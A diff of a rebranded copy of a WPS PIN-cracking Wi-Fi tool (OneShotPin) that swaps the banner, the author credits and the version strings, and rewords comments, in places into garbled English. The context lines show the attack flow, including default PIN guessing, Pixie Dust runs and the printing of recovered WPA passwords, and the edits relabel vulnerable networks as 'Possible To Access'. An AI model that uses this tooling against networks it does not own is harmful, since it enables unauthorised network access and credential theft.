@@ -1,5 +1,8 @@
 #!/usr/bin/env python3
-
+# -*- coding: utf-8 -*-
+# Modify History : rofl0r => Biri_B@B@ => Mohammad_Alamin (Toxinum)
+# VERSION 1.0.1
+# Open Source Code.No Need More Modification.
 import sys, subprocess, os, tempfile, shutil, re, codecs, socket, pathlib, time, collections, statistics, collections, csv, http.client, marshal
 from time import sleep 
 from datetime import datetime
@@ -349,7 +352,7 @@ class PixiewpsData:
 
 class ConnectionStatus:
     def __init__(self):
-        self.status = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
+        self.status = ''   # Must sure that WSC_NACK, WPS_FAIL or GOT_PSK #
         self.last_m_message = 0
         self.essid = ''
         self.wpa_psk = ''
@@ -365,7 +368,7 @@ class BruteforceStatus:
     def __init__(self):
         self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         self.mask = ''
-        self.last_attempt_time = time.time()   # Last PIN attempt start time
+        self.last_attempt_time = time.time()   # That Last PIN attempt start  #
         self.attempts_times = collections.deque(maxlen=15)
 
         self.counter = 0
@@ -431,7 +434,7 @@ class Companion:
         cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
         self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                      stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
-        # Waiting for wpa_supplicant control interface initialization
+        # Waiting for wpa  control interface initialization
         while not os.path.exists(self.wpas_ctrl_path):
             pass
 
@@ -514,7 +517,7 @@ class Companion:
             self.connection_status.status = 'WPS_FAIL'
             print('[\033[1;31m-\033[1;37m] wpa_supplicant returned WPS-FAIL')
 #        elif 'NL80211_CMD_DEL_STATION' in line:
-#            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
+#            print("[!] Unexpected interference — kill wpa_supplicant!")
         elif 'Trying to authenticate with' in line:
             self.connection_status.status = 'authenticating'
             if 'SSID' in line:
@@ -658,7 +661,7 @@ class Companion:
         if not pin:
             if pixiemode:
                 try:
-                    # Try using the previously calculated PIN
+                    # Try using the previous using PIN
                     filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                     with open(filename, 'r') as file:
                         t_pin = file.readline().strip()
@@ -669,7 +672,7 @@ class Companion:
                 except FileNotFoundError:
                     pin = self.generator.getLikely(bssid) or '12345670'
             else:
-                # If not pixiemode, ask user to select a pin from the list
+                # If not pixiemode, ask user to select a pin from the lists
                 pin = self.__prompt_wpspin(bssid) or '12345670'
 
         if store_pin_on_fail:
@@ -686,7 +689,7 @@ class Companion:
             self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
             if self.save_result:
                 self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
-            # Try to remove temporary PIN file
+            # Try to reduse temporary PIN file
             filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
             try:
                 os.remove(filename)
@@ -704,7 +707,7 @@ class Companion:
                 return False
         else:
             if store_pin_on_fail:
-                # Saving Pixiewps calculated PIN if can't connect
+                # Saving Pixiewps using PIN if can't connect
                 self.__savePin(bssid, pin)
             return False
 
@@ -912,18 +915,18 @@ class WiFiScanner:
                 if res:
                     handler(line, res, networks)
 
-        # Filtering non-WPS networks
+        # Filtering non-WPS networks of a current range 
         networks = list(filter(lambda x: bool(x['WPS']), networks))
         if not networks:
             return False
 
-        # Sorting by signal level
+        # Sorting by signal level of this networks
         networks.sort(key=lambda x: x['Level'], reverse=True)
 
-        # Putting a list of networks in a dictionary, where each key is a network number in list of networks
+
         network_list = {(i + 1): network for i, network in enumerate(networks)}
 
-        # Printing scanning results as table
+        # Printing scanning the results as table
         def truncateStr(s, length, postfix='…'):
             """
             Truncate string with the specified length
@@ -953,14 +956,14 @@ class WiFiScanner:
         if self.vuln_list:
             print('Network marks: {1} {0} {2} {0} {3}'.format(
                 '|',
-                colored('Possible Security Risk', color='green'),
+                colored('Possible To Access', color='green'),
                 colored('WPS locked', color='red'),
                 colored('Already stored', color='yellow')
             ))
         print('Networks list:')
         print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
             '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model'))
-        print ('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+        print ('━━━━━━━━━━━━━━━━━━#############━━━━━━━━━━━━━━━━━━')
          
 
         network_list_items = list(network_list.items())
@@ -989,26 +992,29 @@ class WiFiScanner:
 
     def prompt_network(self) -> str:
         os.system('clear')
-        print(''' print("""
-██╗    ██╗██╗███████╗██╗   ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗     
-██║    ██║██║██╔════╝██║   ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝     
-██║ █╗ ██║██║█████╗  ██║   ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗    
-██║███╗██║██║██╔══╝  ██║   ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║    
-╚███╔███╔╝██║██║     ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝    
- ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝
+        print(''' __        ___ _____ _       _   _    _    ____ _  __ 
+ 
 
-.;'                     `;,     
-     .;'  ,;'             `;,  `;,   
-    .;'  ,;'  ,;'     `;,  `;,  `;, 
-    ::   ::   :   ( )   :   ::   ::   Contributors : @bunny00_x
-    ':.  ':.  ':. /_\\ ,:'  ,:'  ,:'
-     ':.  ':.    /___\\    ,:'  ,:'
-      ':.       /_____\\      ,:'                                  
-               /       \\               Tools : WiFi/Hacking & Networking                                                              
-    -------------------------------------------------------------------------  
-           #WiFi v1.0.0 coded by Bunny0x0#
-""")
-                                                  \n\t\t[\033[1;32m*\033[1;37m] Modified by : Nishan \n\t\t[\033[1;32m*\033[1;37m] Version     : 7.0.0 \n\t\t[\033[1;32m*\033[1;37m] Telegram    : @bunny00_x \n''')
+             .;'                     `;,     
+             .;'  ,;'             `;,  `;,   
+            .;'  ,;'  ,;'     `;,  `;,  `;, 
+            ::   ::   :   ( )   :   ::   ::   
+             ':.  ':.    /___\\    ,:'  ,:'
+              ':.       /_____\\      ,:'                                  
+                       /       \\               
+
+    Tools : WiFi/Hacking & Networking                                                              
+    ------------------------------------------------------
+     ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
+     ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
+     █████╔╝ █████╗  ██║  ██║
+     ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║
+     ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝
+     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ 
+
+    ━━━━━━━━━━━━━━━━━━#############━━━━━━━━━━━━━━━━━━
+              
+                  \n\t\t[\033[1;32m*\033[1;37m] Modified by : Nishan \n\t\t[\033[1;32m*\033[1;37m] Version     : 7.0.0 \n\t\t[\033[1;32m*\033[1;37m] Telegram    : @bunny00_x  \n''')
         networks = self.iw_scanner()
         if not networks:
             ani('[\033[1;31m-\033[1;37m] No WPS networks found!')
@@ -1054,7 +1060,7 @@ def die(msg):
 
 def usage():
     return """
-OneShotPin 0.0.2 (c) 2017 rofl0r (modified).
+OneShotPin 7.0.1 (c) 2025 bunny0x0 (modified).
 
 %(prog)s <arguments>
 
@@ -1087,7 +1093,7 @@ if __name__ == '__main__':
     import argparse
 
     parser = argparse.ArgumentParser(
-        description='OneShotPin 0.0.2 (c) 2017 rofl0r (modified).',
+        description='OneShotPin 7.0.1 (c) 2025 bunny0x0 (modified).',
         epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K'
         )
 
